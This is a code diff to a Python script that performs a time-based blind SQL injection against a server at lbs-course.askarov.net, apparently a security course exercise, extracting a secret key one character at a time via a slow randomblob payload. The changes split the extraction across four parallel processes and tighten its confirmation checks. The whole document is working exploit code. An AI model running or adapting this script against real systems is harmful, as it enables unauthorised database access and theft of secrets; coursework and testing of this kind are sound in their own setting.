@@ -4,6 +4,7 @@ import urllib as url
 import time
 import string
 import sys
+from multiprocessing import Process
 
 adress = "lbs-course.askarov.net"
 port = 3030
@@ -15,7 +16,7 @@ slowQuery = " and length(hex(randomblob(9999999)))"
 injectionEnd = ";--"
 
 maxDelay = 0.2
-fileName = "keySoFar_substr.txt"
+fileName = "keySoFar_thread"
 
 keyChars = list("\n +-/"+string.digits+":="+string.ascii_uppercase+string.ascii_lowercase)
 
@@ -47,9 +48,9 @@ def findNextChar(index,tries=0):
      #       print("found char: "+char+" at index:"+str(index))
             #Sanitychecking
             counter = 0
-            for i in range(0,5):
+            for i in range(0,10):
 #                print(counter)
-                if counter>2 :
+                if counter>5 :
                     return char
                 if isCorrect(queryOnce(index,char)):
                     counter = counter+1 
@@ -61,31 +62,43 @@ def findNextChar(index,tries=0):
 
 
 
-def writeToFile(key):
+def writeToFile(number,key):
     if key==None:
         return
     print('writing '+ str(len(key))+' characters to file')
-    f = open(fileName,'w')
+    f = open(fileName+str(number),'w')
     f.write(key)
     f.close()
 
-def main():
-    f = open(fileName,'r')
+def loop(number,start,end):
+    f = open(fileName+str(number),'r')
     key = f.read()
     f.close()
     offset = len(key)+1
-    for i in range(offset,3508):
+    for i in range(start+offset,end):
 #        print ("starting index: "+str(i))
         nextChar = findNextChar(i)
         if nextChar==None:
-            writeToFile(key)
+            writeToFile(number,key)
             return
         key +=nextChar
         if i%10==0:
             print(key)
-            writeToFile(key)
-    writeToFile(key)
+            writeToFile(number,key)
+    writeToFile(number,key)
     return
+
+def main():
+    size = 877
+    try:
+        for i in range(0,4):
+            print("starting thread: "+str(i))
+            p = Process(target=loop, args=(i,size*i,size*(i+1)))
+            p.start()
+    except:
+        print "Error threading"
+    while True:
+        time.sleep(10)
 
 if __name__ == "__main__":
     main()
